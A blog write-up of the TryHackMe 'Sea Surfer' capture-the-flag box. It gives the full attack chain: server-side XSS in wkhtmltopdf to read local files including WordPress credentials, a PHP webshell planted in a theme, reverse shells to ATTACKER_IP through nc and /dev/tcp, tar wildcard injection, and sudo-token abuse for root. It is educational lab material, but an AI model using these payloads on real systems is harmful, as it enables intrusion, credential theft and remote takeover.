---
layout: post
title:  "Sea Surfer Writeup"
date:   2024-06-19 00:00:00 -0400
categories: tryhackme hard
tags: writeup tryhackme hard CTF XSS tar-wildcard sudo-token
---
## Introduction
This is a hard challenge box on
[TryHackMe](https://tryhackme.com/r/room/seasurfer){:target="_blank"}{:rel="noopener noreferrer"}.
It'll take 5 minutes to boot up

> This is what a hint will look like!
{: .prompt-tip }

## Enumeration
### Port Scan
Let's start with a port scan to see what services are
accessible

```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![scan1](/images/seasurf/scan1.png)

![scan2](/images/seasurf/scan2.png)

There are two open ports
- 22: SSH
- 80: HTTP

### Domain Name
> Look at the HTTP response headers
{: .prompt-tip }

When we visit the ip we see this

![apache homepage](/images/seasurf/homepage-apache.png)

It's the default apache homepage. This isn't a lot to go off
of but if we interecept this request with something like
`Burp Suite`, we see an interesting response header

![burp domain](/images/seasurf/burp-domain.png)

The `X-Backend-Server` header refers to the domain
`seasurfer.thm`. Add this to `/etc/hosts` so we
can access it

```
VICTIM_IP seasurfer.thm
```

### Web Enumeration
> Are there useful hidden directories?
{: .prompt-tip }

Now when we visit the domain `seasurfer.thm` we'll see something
different

![homepage](/images/seasurf/homepage.png)

It's a full site! Let's check `robots.txt` for any
hidden directories

![robots](/images/seasurf/robots.png)

Looks like it's running wordpress. The login
page will be in `/wp-admin` so remember that for later.

Now let's try to brute force some hidden directories.
I like to use
[dirsearch](https://github.com/maurosoria/dirsearch){:target="_blank"}{:rel="noopener noreferrer"}
since it automatically searches folders recursively.
We can start the search with the command

```bash
dirsearch -w /usr/share/wordlists/dirb/big.txt -r --threads=50 --url=http://seasurfer.thm --output=dirsearch.txt
```
> Lower the thread count if it doesn't work correctly
{: .prompt-info }

![dirsearch](/images/seasurf/dirsearch.png)

The `adminer` directory sticks out so let's visit the page

![adminer](/images/seasurf/adminer.png)

Looks like this will allow us to access a database if
we have the proper credentials. Seems important but we
don't have anything for it (yet)

We haven't fully checked what the site has to offer
so let's visit the blog section and see if we can find
any interesting posts or comments

![subdomain hint](/images/seasurf/subdomain-hint.png)

Looks like `brandon` is trying to access another subdomain.
He's spelling `internal` incorrectly so that's probably
what we should visit next but there could be other hidden
domains. We can brute force subdomains with `wfuzz`

```bash
wfuzz -c --hc 302 -t 50 -u http://seasurfer.thm -H 'Host: FUZZ.seasurfer.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 964
```

![subdomains](/images/seasurf/subdomain-wfuzz.png)

Looks like `internal` is the only subdomain. We should
add it to our `/etc/hosts` file so it looks like this

```
VICTIM_IP seasurfer.thm internal.seasurfer.thm
```

### Internal Subdomain
Now we can visit the page and see what it offers

![internal homepage](/images/seasurf/internal-homepage.png)

A receipt generator! Fill it with some values and we'll
see what happens

![receipt test](/images/seasurf/receipt-test.png)

Looks like our values are sent through a pdf generator.
We can find out more by checking the `Document Properties`
on firefox

![pdf info](/images/seasurf/pdf-info.png)

The pdf is generated with `wkhtmltopdf` version `0.12.5`

## Initial Foothold
> Research vulnerabilites regarding `wkhtmltopdf` version `0.12.5`
{: .prompt-tip }

We have a service name along with a version number so
let's see if there it is vulnerable to anything.
According to
[CVE-2020-21365](https://nvd.nist.gov/vuln/detail/CVE-2020-21365){:target="_blank"}{:rel="noopener noreferrer"}
this service is vulnerable to local file reads!

### Local File Read
> Try different methods for reading a local file!
{: .prompt-tip }

To test this out we can first try to write to the
document using `javascript`. Place this into any of 
the fields that will accept it then generate the
receipt

```html
<script>document.write('script write');</script>
```

![script test](/images/seasurf/script-test.png)

Notice how the `<script>` tags aren't placed into
the output. This means that the generator is
running the code we inputted! This is a `Server Side XSS`
and we can find
[additional payloads here](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf){:target="_blank"}{:rel="noopener noreferrer"}

Now we can try to read a local file such as `/etc/passwd`

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

![passwd fail](/images/seasurf/passwd-fail.png)

It doesn't work! According to the
[issue page](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536){:target="_blank"}{:rel="noopener noreferrer"}
it's possible that the service is running with
the `--disable-local-file-access` flag which will
prevent local file reads. Luckily, there is a workaround!

According to
[this cheatsheet](https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/){:target="_blank"}{:rel="noopener noreferrer"}
we should still be able to read local files by having
the service make a request to our server.

First write this to a file called `read.php`

```php
<?php header('location:file://'.$_REQUEST['x']); ?>
```

Then start a php web server in the same directory as
this file

```bash
php -S 0.0.0.0:80
```

> A `python` web server won't process the
> request correctly!
{: .prompt-info }

Now we should be able to send a request using the following
payload with `ATTACKER_IP` replaced with your ip

```html
<iframe src=http://ATTACKER_IP/read.php?x=/etc/passwd></iframe>
```

![passwd small](/images/seasurf/passwd-small.png)

We have a file read! This is a little too small to get
everything so we can just make the `iframe` bigger

```html
<iframe src=http://ATTACKER_IP/read.php?x=/etc/passwd width=1000px height=1000px></iframe>
```

![passwd full](/images/seasurf/passwd-full.png)

### Credentials
> What files could have database credentials?
{: .prompt-tip }

Now that we have a working local file read, what local
file should we read?

Recall that this site is running `wordpress`, so let's
try to read the equivalent config file `wp-config.php`

```html
<iframe src=http://10.13.51.71/read.php?x=/var/www/wordpress/wp-config.php width=1000px height=1000px></iframe>
```

![wordpress config](/images/seasurf/wordpress-config.png)

We have database credentials! We also found the `/adminer`
directory on `seasurfer.thm` which will let us read
a database, so let's put this all together

![adminer](/images/seasurf/adminer-login.png)

Let's see what's in the `wp_users` table

![kyle password](/images/seasurf/kyle-pw.png)

We have kyle's password hash! Add it to a file so we
can crack it

```
kyle:PW_HASH_HERE
```

Now we can use `john` and `rockyou.txt` to crack the
hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=3 --progress-every=30 crack.txt
```

![kyle crack](/images/seasurf/kyle-crack.png)

### Shell
> Where can you modify `php` files in wordpress?
{: .prompt-tip }

We have some credentials so let's login to wordpress by
visiting 

```
http://seasurfer.thm/wp-admin
```

Now let's add a
[php webshell](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}
into a theme template file. I'll use this payload and
add it into the homepage file `front-page.php`

```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

![webshell](/images/seasurf/webshell.png)

When we visit the homepage with the `cmd` HTTP parameter
set, it will run that command. Let's test it to make
sure it works

```
http://seasurfer.thm/?cmd=ls%20-la
```

![webshell test](/images/seasurf/webshell-test.png)

Perfect! Now we can upgrade this to a reverse shell.
This usually takes some trial and error to find a payload
that works, but I used the `nc mkfifo` payload with 
`URL Encoding` generated by
[this site](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20ATTACKER_IP%204444%20%3E%2Ftmp%2Ff
```

Now we just need to set up a listener to catch the
request, and then send the payload

```bash
nc -lvnp
```

![reverse shell](/images/seasurf/revshell.png)

We're in! We can upgrade and stabilize our shell
so that we can use tab autocomplete and ctrl+c with
the following

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl + z to background the shell
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

## Horizontal Escalation
> Are there any scripts that run on a schedule?
{: .prompt-tip }

There are a few ways to find scheduled programs.
Usually you can check `/etc/crontab` or one
of its alternatives. You could also use the
process spying tool
[pspy](https://github.com/DominicBreuker/pspy){:target="_blank"}{:rel="noopener noreferrer"}
which will monitor processess without needing root.

These options will make things conclusive but I just
stumbled into finding a backup script in 
`/var/www/internal/maintenance` which tells us it runs
on a schedule

![backup script](/images/seasurf/backup-script.png)

This seems like a normal backup script but it is vulnerable
to
[wildcard injection](https://www.exploit-db.com/papers/33930){:target="_blank"}{:rel="noopener noreferrer"}.
The `tar` command has options that
[allow arbitrary command execution](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar){:target="_blank"}{:rel="noopener noreferrer"}

To execute arbitrary commands with `tar`, create the
following files which will act as flags when interpreted
by `tar`

```bash
cd /var/www/internal/invoices
echo 'asdf' > '--checkpoint=1'
echo 'asdf' > '--checkpoint-action=exec=sh shell.sh'
```

Next add your payload into `shell.sh`. Here we'll create
a reverse shell as the kyle user

```bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Set up a listener on the attacking machine

```bash
nc -lvnp 4444
```

Then wait for the script to run

![kyle reverse shell](/images/seasurf/kyle-revshell.png)

We can upgrade our shell here but since `ssh` is open,
we can just drop our machine's public key into
`/home/kyle/.ssh/authorized_hosts` to give us a stable
foothold

![kyle ssh](/images/seasurf/kyle-ssh.png)

Now we can read the user flag

![user flag](/images/seasurf/user-flag.png)

## Root
> Are there any `sudo` commands running?
{: .prompt-tip }

When we run `linpeas` on the system, we see this

![sudo linpeas](/images/seasurf/sudo-linpeas.png)

We have the potential to abuse `sudo` tokens, but
there are a few prerequisites we must fulfill.
[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens){:target="_blank"}{:rel="noopener noreferrer"}
has a good guide on this.

The prerequisites are as follows
1. You need to have a shell as the user
2. The user has executed something with
`sudo` in the last 15 minutes
3. `cat /proc/sys/kernel/yama/ptrace_scope` is 0
4. `gdb` is accessible

We already have a shell as the user so that's the first
requirement filled. We can check if there are any `sudo`
commands being run with the following

```bash
ps aux | grep sudo
```

![sudo processes](/images/seasurf/sudo-procs.png)

There's a `kyle` process running `sudo /root/admincheck`
and then sleeping until infinity. This is fine but remember
the `sudo` command needs to have been run in the last
15 minutes. If it took more than 15 minutes since booting
the machine to get to this point, you will need to reboot
the machine and get back here. The credentials aren't
randomized so you can directly login to wordpress after
the restart, giving you a faster foothold.

Even though we ran `linpeas`, we
can check the `ptrace` protections again to be sure

```bash
cat /proc/sys/kernel/yama/ptrace_scope
```

![ptrace check](/images/seasurf/ptrace-check.png)

Okay great, things have been smooth so far but now
we need to do some work. `gdb` isn't on the system!
We also can't install packages with `apt` since
we don't have `root` yet. Seems like we'll need to
install it manually.

We should get the operating system information so
we can download the correct package

```bash
cat /proc/version;cat /etc/issue;
```

![ubuntu version](/images/seasurf/ubuntu-version.png)

We're running `Ubuntu 20.04.4` so let's download the
corresponding
[gdb package](https://packages.ubuntu.com/focal/amd64/gdb/download){:target="_blank"}{:rel="noopener noreferrer"}
and upload it to the server.

According to
[this stackoverflow post](https://unix.stackexchange.com/questions/282224/how-to-extract-and-install-deb-without-the-command-dpkg){:target="_blank"}{:rel="noopener noreferrer"}
we can unpack the `.deb` file with `ar` and `tar`. Since
we just want the binary and don't need to install it
system wide, this is enough. We only need to run the
following

```bash
ar x gdb_9.1-0ubuntu1_amd64.deb
tar xf data.tar.xz
cd /usr/bin
```

![gdb install](/images/seasurf/gdb-install.png)

We can run `gdb` from here so let's add this directory
to our `PATH` variable

```bash
export PATH=$(pwd):$PATH
```

![gdb path](/images/seasurf/gdb-path.png)

Now that we have `gdb` installed, we can abuse `sudo`
tokens with the scripts
[provided by this repo](https://github.com/nongiach/sudo_inject){:target="_blank"}{:rel="noopener noreferrer"}.
By uploading the second exploit script `exploit_v2.sh`
and running it, if all of our pre requisites are met, 
we should be able to get a `root` shell with `/tmp/sh -p`

![root shell](/images/seasurf/root-shell.png)

Awesome! Now we can read the `root` flag

![root flag](/images/seasurf/root-flag.png)

## Conclusion
By checking the response headers when visiting the
machine ip, we found the domain name used by the server.
Visiting this domain lead to a site made with wordpress.
Further enumeration found the `/adminer` directory which
gives database entries with the proper credentials.
Using `wfuzz` we found the `internal` subdomain
which gave us a way to generate a pdf receipt. The pdf
generator was vulnerable to `Server Side XSS` (javascript injection). 
This was leveraged to read local files on the system, 
leaking database credentials. Cracking these credentials
allowed us to modify wordpress template files. This
gave us a web shell and reverse shell into the system.
Abusing a `tar` wildcard injection in a backup script
gave us access to the `kyle` user. By taking advantage of
`sudo` tokens, we were able to create a `root` shell.
